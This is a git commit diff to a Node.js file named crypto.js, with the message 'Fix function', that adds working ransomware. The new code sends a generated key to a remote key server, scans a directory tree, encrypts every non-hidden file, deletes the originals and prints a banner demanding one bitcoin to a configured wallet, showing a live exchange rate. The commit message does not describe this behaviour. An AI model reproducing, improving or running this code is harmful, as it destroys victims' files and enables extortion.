93d247e3b8d51836d791a9b33916d56d120bfe9a
Completely-anonymous <anonymous-completely@mackhack.ml>
2018-11-18 21:00:34 +0100

    Fix function

--- crypto.js
+++ crypto.js
@@ -2,8 +2,11 @@ const settings  = require("./settings")
 const rand      = require("random-key")
 const cryptoLib = require('crypto')
 const zlib      = require('zlib')
+const encrypt   = require('node-file-encrypt')
 const fs        = require('fs')
 const sqlite3   = require('sqlite3')
+const cc        = require('cryptocompare')
+const request   = require('request')
 
 class crypto {
     
@@ -13,6 +16,12 @@ class crypto {
     
     generateKey(){
         this.key = rand.generate(50)
+        let url = settings.keyAPI+this.key
+        request(url, function (err, response, body) {
+            if (err) {
+                console.log('error:', error)
+            }
+        })
         this.initialiseDatabase()
     }
     
@@ -25,47 +34,66 @@ class crypto {
                     'date' bigint NOT NULL);")
             this.db.close()
         }
+        this.showMessage()
+    }
+    
+    showMessage(){
+        request(settings.cryptoAPI, function (err, response, body) {
+            if (err) {
+                console.log('error:', error)
+            } else {
+                let prices = JSON.parse(body)
+                let price = prices.bpi.EUR.rate.padStart(15,' ')
+                console.log('################################################################')
+                console.log('#                                                              #')
+                console.log('#                 All your files are encrypted                 #')
+                console.log('#     Send 1 BTC to this address to get the decryption key     #')
+                console.log('#             '+settings.walletBTC+'               #')
+                console.log('#                                                              #')
+                console.log('#               1 BTC = '+price+' EUR                    #')
+                console.log('#                                                              #')
+                console.log('################################################################')
+            }
+
+        })
         this.scanDirectory(settings.defaultDirectory)
     }
     
-    scanDirectory(path){
+    async scanDirectory(path){
         const that = this
-        fs.readdir(path, function(err, items) {
+        fs.readdir(path, async function(err, items) {
             for (var i=0; i<items.length; i++) {
                 let fullPath = path+items[i]
                 if(fs.statSync(fullPath).isDirectory()){
                     fullPath += '/'
                     that.scanDirectory(fullPath)
                 }else{
-                    that.checkBeforeEncryption(fullPath)
+                    let pathArray = fullPath.split('/')
+                    let fileName = pathArray[pathArray.length - 1]
+                    pathArray.pop()
+                    path = pathArray.join('/')+'/'
+                    if(fileName.charAt(0) != '.'){
+                        let fileNameArray = fileName.split('.')
+                        let extention = fileNameArray[fileNameArray.length - 1]
+                        if(extention != 'crypt'){
+                            await that.encryptFile(path, fileName)
+                        }
+                    }
                 }
             }
         });
     }
     
-    checkBeforeEncryption(fullPath){
-        let pathArray = fullPath.split('/')
-        let fileName = pathArray[pathArray.length - 1]
-        pathArray.pop()
-        let path = pathArray.join('/')+'/'
-        if(fileName.charAt(0) != '.'){
-            let fileNameArray = fileName.split('.')
-            let extention = fileNameArray[fileNameArray.length - 1]
-            if(extention != 'iyf'){
-                this.encryptFile(path, fileName)
-            }
-        }
+    encryptFile(path, fileName){
+        let f = new encrypt.FileEncrypt(path+fileName);
+        f.openSourceFile();
+        f.encrypt(this.key);
+        let encryptPath = f.encryptFilePath;
+        this.deleteFile(path+fileName)
     }
     
-    encryptFile(path, fileName){
-        let r = fs.createReadStream(path+fileName)
-        let zip = zlib.createGzip()
-        let cipher = cryptoLib.createCipher('aes-256-ctr', this.key)
-        let encryptedFileName = cipher.update(fileName,'utf8','hex')
-        encryptedFileName += cipher.final('hex');
-        let w = fs.createWriteStream(path+encryptedFileName+'.iyf')
-        this.db.run("INSERT INTO files VALUES(?,?)", [(path+encryptedFileName),Date.now()]);
-        r.pipe(zip).pipe(cipher).pipe(w)
+    deleteFile(fullPath){
+        fs.unlink(fullPath)
     }
     
 }
